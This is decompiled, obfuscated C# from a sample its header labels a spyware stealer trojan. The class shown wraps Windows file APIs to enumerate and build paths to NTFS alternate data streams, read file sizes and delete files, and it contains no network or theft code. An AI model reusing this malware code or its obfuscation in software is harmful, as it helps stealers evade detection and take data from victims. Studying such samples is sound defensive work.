// Decompiled with JetBrains decompiler
// Type: Xq8heDpTCPJayNT7lI.c3hEZ9mp5bx1n1O0gO
// Assembly: StaticArrayInitTypeSiz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F19BBEE0-E53D-4450-9FD0-690E55E6EA19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f0ecfcd8bb00afbfd59777ba3abc9203b4a527d8ea974dcf87076b4d013c0af1.exe

using HeavyDuck.Properties;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Xq8heDpTCPJayNT7lI
{
  internal static class c3hEZ9mp5bx1n1O0gO
  {
    private static readonly char[] HngAACd9R2;
    private static c3hEZ9mp5bx1n1O0gO iTReHrQeiJAXVmGsZp5;

    [DllImport("kernel32.dll", EntryPoint = "FormatMessage", CharSet = CharSet.Auto, ThrowOnUnmappableChar = true, BestFitMapping = false)]
    private static extern int hyj6DHfsoN(
      int _param0,
      IntPtr _param1,
      int _param2,
      int _param3,
      StringBuilder _param4,
      int _param5,
      IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "GetFileAttributes", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int wEX6dVp3kb(string _param0);

    [DllImport("kernel32", EntryPoint = "GetFileSizeEx", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool HSp6ehRgbO(
      SafeFileHandle _param0,
      out c3hEZ9mp5bx1n1O0gO.oHGb9V14HE3TAyv4vP _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetFileType")]
    private static extern int EV56UpZosx(SafeFileHandle _param0);

    [DllImport("kernel32", EntryPoint = "CreateFile", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern SafeFileHandle rRb6itaJKJ(
      string _param0,
      c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP _param1,
      FileShare _param2,
      IntPtr _param3,
      FileMode _param4,
      c3hEZ9mp5bx1n1O0gO.JvB8ppwAPlICkln4rh _param5,
      IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "DeleteFile", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool Mek6T3bwaU(string _param0);

    [DllImport("kernel32", EntryPoint = "BackupRead", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool P7x6kljeAY(
      SafeFileHandle _param0,
      ref c3hEZ9mp5bx1n1O0gO.KNnTfWf1a5w6kLOKB1 _param1,
      int _param2,
      out int _param3,
      [MarshalAs(UnmanagedType.Bool)] bool _param4,
      [MarshalAs(UnmanagedType.Bool)] bool _param5,
      ref IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "BackupRead", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool VI76YUrBjX(
      SafeFileHandle _param0,
      kcT7uDy4ii8Y2kFFkL _param1,
      int _param2,
      out int _param3,
      [MarshalAs(UnmanagedType.Bool)] bool _param4,
      [MarshalAs(UnmanagedType.Bool)] bool _param5,
      ref IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "BackupSeek", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool vy76Bk9OO0(
      SafeFileHandle _param0,
      int _param1,
      int _param2,
      out int _param3,
      out int _param4,
      ref IntPtr _param5);

    private static int NIo6G4FUGx(int _param0) => -2147024896 | _param0;

    private static string KSt6c23NdP(int _param0)
    {
      StringBuilder stringBuilder = new StringBuilder(512);
      bool flag = c3hEZ9mp5bx1n1O0gO.hyj6DHfsoN(12800, IntPtr.Zero, _param0, 0, stringBuilder, stringBuilder.Capacity, IntPtr.Zero) != 0;
      int num1 = 0;
      if (c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() != null)
        goto label_2;
label_1:
      switch (num1)
      {
        default:
          if (flag)
            return stringBuilder.ToString();
          return string.Format((IFormatProvider) Resources.wbGAydOoAa, "", new object[1]
          {
            (object) _param0
          });
      }
label_2:
      int num2;
      num1 = num2;
      goto label_1;
    }

    private static void TCt6Wg8qKM(int _param0, string _param1)
    {
      int num1 = _param0;
      if (num1 <= 2)
      {
        if (num1 == 0)
          return;
      }
      else
        goto label_11;
label_8:
      if (num1 == 2)
      {
        if (string.IsNullOrEmpty(_param1))
          throw new FileNotFoundException();
        throw new FileNotFoundException((string) null, _param1);
      }
      goto label_18;
label_11:
      if (num1 == 87)
        throw new IOException((string) c3hEZ9mp5bx1n1O0gO.LaBqv8Qk1rE42UveVAs(_param0), c3hEZ9mp5bx1n1O0gO.NIo6G4FUGx(_param0));
      if (num1 == 206)
        throw new PathTooLongException();
      int num2 = 0;
      if (!c3hEZ9mp5bx1n1O0gO.O7jR5DQm5xY02QaH0O6())
        goto label_6;
label_1:
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_8;
          case 2:
            goto label_18;
          case 3:
            goto label_12;
          default:
            if (num1 != 995)
            {
              num2 = 2;
              continue;
            }
            goto label_17;
        }
      }
label_12:
      return;
label_17:
      throw new OperationCanceledException();
label_6:
      int num3;
      num2 = num3;
      goto label_1;
label_18:
      Marshal.ThrowExceptionForHR(c3hEZ9mp5bx1n1O0gO.NIo6G4FUGx(_param0));
    }

    public static void JUF6hRm8JF(string _param0)
    {
      int lastWin32Error = Marshal.GetLastWin32Error();
      if (lastWin32Error == 0)
        return;
      if (0 <= Marshal.GetHRForLastWin32Error())
        throw new Win32Exception(lastWin32Error);
      c3hEZ9mp5bx1n1O0gO.TCt6Wg8qKM(lastWin32Error, _param0);
      int num = 0;
      if (c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() == null)
        goto label_5;
label_1:
      switch (num)
      {
        default:
          return;
      }
label_5:
      num = 0;
      goto label_1;
    }

    public static c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP Npm6NqBU6u(
      this FileAccess _param0)
    {
      c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP uiTr5QmdaE9mIuiP = (c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP) 0;
      if (FileAccess.Read == (FileAccess.Read & _param0))
        goto label_4;
      else
        goto label_6;
label_1:
      int num1;
      switch (num1)
      {
        default:
          if (FileAccess.Write == (FileAccess.Write & _param0))
            uiTr5QmdaE9mIuiP |= (c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP) 1073741824;
          return uiTr5QmdaE9mIuiP;
      }
label_4:
      uiTr5QmdaE9mIuiP |= (c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP) 2147483648;
      num1 = 0;
      if (c3hEZ9mp5bx1n1O0gO.O7jR5DQm5xY02QaH0O6())
      {
        num1 = 0;
        goto label_1;
      }
      else
        goto label_1;
label_6:
      int num2;
      num1 = c3hEZ9mp5bx1n1O0gO.O7jR5DQm5xY02QaH0O6() ? 1 : num2;
      goto label_1;
    }

    public static string KNK6SQG6m5(string _param0, string _param1)
    {
      string str = _param0;
      if (!string.IsNullOrEmpty(_param0))
        goto label_8;
label_3:
      return str;
label_8:
      if (1 == str.Length)
        str = ".\\" + str;
      str = (string) c3hEZ9mp5bx1n1O0gO.Fdv2TkQxcPm6iTXyhNp((object) str, (object) ":", (object) _param1, (object) ":$DATA");
      bool flag = 256 <= str.Length;
      int num1 = 0;
      if (c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() != null)
        goto label_6;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_2;
          default:
            if (flag)
            {
              str = "\\\\?\\" + str;
              num1 = c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() == null ? 1 : 1;
              continue;
            }
            goto label_2;
        }
      }
label_2:
      goto label_3;
label_6:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public static void nWX6RmUity(string _param0)
    {
    }

    public static int EGJ6EBZgFH(string _param0)
    {
      if (!c3hEZ9mp5bx1n1O0gO.iFjKM9Q5Y1GkOKj885P((object) _param0))
        goto label_7;
      else
        goto label_5;
label_1:
      bool flag;
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          throw new ArgumentNullException("name");
        default:
          if (flag && 2 != Marshal.GetLastWin32Error())
            c3hEZ9mp5bx1n1O0gO.JUF6hRm8JF(_param0);
          return num1;
      }
label_5:
      num2 = c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() == null ? 1 : 0;
      goto label_1;
label_7:
      num1 = c3hEZ9mp5bx1n1O0gO.wEX6dVp3kb(_param0);
      flag = -1 == num1;
      num2 = 0;
      if (!c3hEZ9mp5bx1n1O0gO.O7jR5DQm5xY02QaH0O6())
      {
        int num3;
        num2 = num3;
        goto label_1;
      }
      else
        goto label_1;
    }

    public static bool E3t6JQUXqH(string _param0)
    {
      bool flag1 = !string.IsNullOrEmpty(_param0) ? c3hEZ9mp5bx1n1O0gO.Mek6T3bwaU(_param0) : throw new ArgumentNullException("name");
      if (flag1)
        goto label_4;
      else
        goto label_9;
label_1:
      bool flag2;
      bool flag3;
      int num;
      switch (num)
      {
        case 1:
          if (flag3)
            c3hEZ9mp5bx1n1O0gO.JUF6hRm8JF(_param0);
          break;
        default:
          return flag2;
      }
label_4:
      flag2 = flag1;
      num = 0;
      if (!c3hEZ9mp5bx1n1O0gO.O7jR5DQm5xY02QaH0O6())
      {
        num = 0;
        goto label_1;
      }
      else
        goto label_1;
label_9:
      flag3 = 2 != Marshal.GetLastWin32Error();
      num = !c3hEZ9mp5bx1n1O0gO.O7jR5DQm5xY02QaH0O6() ? 1 : 1;
      goto label_1;
    }

    public static SafeFileHandle NPJ6zw59yJ(
      string _param0,
      c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP _param1,
      FileShare _param2,
      IntPtr _param3,
      FileMode _param4,
      c3hEZ9mp5bx1n1O0gO.JvB8ppwAPlICkln4rh _param5,
      IntPtr _param6)
    {
      SafeFileHandle safeFileHandle = c3hEZ9mp5bx1n1O0gO.rRb6itaJKJ(_param0, _param1, _param2, _param3, _param4, _param5, _param6);
      if (!safeFileHandle.IsInvalid && 1 != c3hEZ9mp5bx1n1O0gO.EV56UpZosx(safeFileHandle))
        safeFileHandle.Dispose();
      return safeFileHandle;
    }

    private static long NRbAl4FafS(string _param0, SafeFileHandle _param1)
    {
      long num1 = 0;
      if (_param1 != null && !_param1.IsInvalid)
      {
        c3hEZ9mp5bx1n1O0gO.oHGb9V14HE3TAyv4vP hgb9V14He3Tayv4vP;
        if (!c3hEZ9mp5bx1n1O0gO.HSp6ehRgbO(_param1, out hgb9V14He3Tayv4vP))
        {
          c3hEZ9mp5bx1n1O0gO.JUF6hRm8JF(_param0);
        }
        else
        {
          int num2 = 0;
          if (c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() != null)
            goto label_6;
label_1:
          while (true)
          {
            switch (num2)
            {
              case 1:
                goto label_7;
              default:
                num1 = hgb9V14He3Tayv4vP.cjMXZv5T06();
                int num3;
                num2 = c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() == null ? 1 : num3;
                continue;
            }
          }
label_6:
          num2 = 0;
          goto label_1;
        }
label_7:;
      }
      return num1;
    }

    public static long LQiApNMeaw(string _param0)
    {
      int num1 = 1;
      long num2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num2 = 0L;
            num1 = c3hEZ9mp5bx1n1O0gO.e9hODIQaeemdsY9mFnS() != null ? 0 : 0;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      if (!string.IsNullOrEmpty(_param0))
      {
        using (SafeFileHandle safeFileHandle = c3hEZ9mp5bx1n1O0gO.NPJ6zw59yJ(_param0, (c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP) 2147483648, FileShare.Read, IntPtr.Zero, FileMode.Open, (c3hEZ9mp5bx1n1O0gO.JvB8ppwAPlICkln4rh) 0, IntPtr.Zero))
          num2 = c3hEZ9mp5bx1n1O0gO.SSdBGaQo1U1vjmmlwTV((object) _param0, (object) safeFileHandle);
      }
      return num2;
    }

    public static IList<c3hEZ9mp5bx1n1O0gO.Cbt5gwOC8uIo2XTnlT> WBCA6uZa6x(
      string _param0)
    {
      if (string.IsNullOrEmpty(_param0))
        throw new ArgumentNullException("filePath");
      List<c3hEZ9mp5bx1n1O0gO.Cbt5gwOC8uIo2XTnlT> cbt5gwOc8uIo2XtnlTList = new List<c3hEZ9mp5bx1n1O0gO.Cbt5gwOC8uIo2XTnlT>();
      using (SafeFileHandle safeFileHandle = c3hEZ9mp5bx1n1O0gO.NPJ6zw59yJ(_param0, (c3hEZ9mp5bx1n1O0gO.X9UITr5QMdaE9mIuiP) 2147483648, FileShare.Read, IntPtr.Zero, FileMode.Open, (c3hEZ9mp5bx1n1O0gO.JvB8ppwAPlICkln4rh) 33554432, IntPtr.Zero))
      {
        using (sV1EG1QnWyew2NtISY v1Eg1QnWyew2NtIsy = new sV1EG1QnWyew2NtISY())
        {
          if (!safeFileHandle.IsInvalid)
          {
            c3hEZ9mp5bx1n1O0gO.KNnTfWf1a5w6kLOKB1 structure = new c3hEZ9mp5bx1n1O0gO.KNnTfWf1a5w6kLOKB1();
            int num1 = Marshal.SizeOf((object) structure);
            bool flag = false;
            IntPtr zero = IntPtr.Zero;
            int num2;
            try
            {
              while (!flag)
              {
                if (!c3hEZ9mp5bx1n1O0gO.P7x6kljeAY(safeFileHandle, ref structure, num1, out num2, false, false, ref zero))
                  flag = true;
                else if (num1 != num2)
                {
                  flag = true;
                }
                else
                {
                  string str;
                  if (0 >= structure.curXyIiNci)
                  {
                    str = (string) null;
                  }
                  else
                  {
                    v1Eg1QnWyew2NtIsy.AnDAH9GHcD(structure.curXyIiNci);
                    if (!c3hEZ9mp5bx1n1O0gO.VI76YUrBjX(safeFileHandle, v1Eg1QnWyew2NtIsy.QZKAjjxAFB(), structure.curXyIiNci, out num2, false, false, ref zero))
                    {
                      str = (string) null;
                      flag = true;
                    }
                    else
                      str = v1Eg1QnWyew2NtIsy.ncxA9CwbUw(num2 >> 1);
                  }
                  if (!string.IsNullOrEmpty(str))
                    cbt5gwOc8uIo2XtnlTList.Add(new c3hEZ9mp5bx1n1O0gO.Cbt5gwOC8uIo2XTnlT()
                    {
                      q2oXmlNJOw = (yLyhUlC3XYWL0L6F17) structure.qJDXxVe8EL,
                      KlcXQTXM8h = (ncRorjxv8AF58pUnCD) structure.u4UXCb97Zk,
                      gksXqlsmZl = structure.HNkXVUrnv2.cjMXZv5T06(),
                      U4LXs7RRUM = str
                    });
                  if (!flag && !c3hEZ9mp5bx1n1O0gO.vy76Bk9OO0(safeFileHandle, structure.HNkXVUrnv2.A3oX7tAw6L, structure.HNkXVUrnv2.XVEXP8BFoV, out int _, out int _, ref zero))
                    flag = true;
                }
              }
            }
            finally
            {
              c3hEZ9mp5bx1n1O0gO.VI76YUrBjX(safeFileHandle, v1Eg1QnWyew2NtIsy.QZKAjjxAFB(), 0, out num2, true, false, ref zero);
            }
          }
        }
      }
      return (IList<c3hEZ9mp5bx1n1O0gO.Cbt5gwOC8uIo2XTnlT>) cbt5gwOc8uIo2XtnlTList;
    }

    static c3hEZ9mp5bx1n1O0gO()
    {
      NxX2fTcxLE28NYvGZm.dOE6C8et8tGSe();
      c3hEZ9mp5bx1n1O0gO.HngAACd9R2 = ((IEnumerable<char>) Path.GetInvalidFileNameChars()).Where<char>((Func<char, bool>) (c => c < '\u0001' || c > '\u001F')).ToArray<char>();
    }

    internal static bool O7jR5DQm5xY02QaH0O6() => c3hEZ9mp5bx1n1O0gO.iTReHrQeiJAXVmGsZp5 == null;

    internal static c3hEZ9mp5bx1n1O0gO e9hODIQaeemdsY9mFnS() => c3hEZ9mp5bx1n1O0gO.iTReHrQeiJAXVmGsZp5;

    internal static object LaBqv8Qk1rE42UveVAs(int _param0) => (object) c3hEZ9mp5bx1n1O0gO.KSt6c23NdP(_param0);

    internal static object Fdv2TkQxcPm6iTXyhNp([In] object obj0, [In] object obj1, [In] object obj2, [In] object obj3) => (object) ((string) obj0 + (string) obj1 + (string) obj2 + (string) obj3);

    internal static bool iFjKM9Q5Y1GkOKj885P([In] object obj0) => string.IsNullOrEmpty((string) obj0);

    internal static long SSdBGaQo1U1vjmmlwTV([In] object obj0, [In] object obj1) => c3hEZ9mp5bx1n1O0gO.NRbAl4FafS((string) obj0, (SafeFileHandle) obj1);

    [Flags]
    public enum JvB8ppwAPlICkln4rh : uint
    {
    }

    [Flags]
    public enum X9UITr5QMdaE9mIuiP : uint
    {
    }

    private struct oHGb9V14HE3TAyv4vP
    {
      public readonly int A3oX7tAw6L;
      public readonly int XVEXP8BFoV;
      internal static object mqMiqkd4KTIPlmjfxJd;

      public long cjMXZv5T06() => (long) this.XVEXP8BFoV * 4294967296L + (long) this.A3oX7tAw6L;

      internal static bool s3vNQid8urokSJgwDoe() => c3hEZ9mp5bx1n1O0gO.oHGb9V14HE3TAyv4vP.mqMiqkd4KTIPlmjfxJd == null;

      internal static object gNY52jdBycSL8lBZwYn() => c3hEZ9mp5bx1n1O0gO.oHGb9V14HE3TAyv4vP.mqMiqkd4KTIPlmjfxJd;
    }

    private struct KNnTfWf1a5w6kLOKB1
    {
      public readonly int qJDXxVe8EL;
      public readonly int u4UXCb97Zk;
      public c3hEZ9mp5bx1n1O0gO.oHGb9V14HE3TAyv4vP HNkXVUrnv2;
      public readonly int curXyIiNci;
    }

    public struct Cbt5gwOC8uIo2XTnlT
    {
      public yLyhUlC3XYWL0L6F17 q2oXmlNJOw;
      public ncRorjxv8AF58pUnCD KlcXQTXM8h;
      public long gksXqlsmZl;
      public string U4LXs7RRUM;
    }
  }
}
